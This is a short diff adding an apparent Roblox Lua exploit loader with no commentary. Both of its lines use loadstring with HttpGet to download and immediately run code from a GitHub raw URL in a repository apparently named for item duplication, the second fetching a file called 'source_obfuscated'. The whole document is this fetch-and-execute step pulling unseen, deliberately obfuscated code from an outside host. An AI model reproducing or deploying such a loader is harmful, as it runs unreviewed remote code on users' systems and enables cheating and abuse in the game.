@@ -1,0 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/22kyasue/22dupes/master/Auto%20Drop", true))()
+wait(3)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/22kyasue/22dupes/master/source_obfuscated", true))()
+
+
+
+
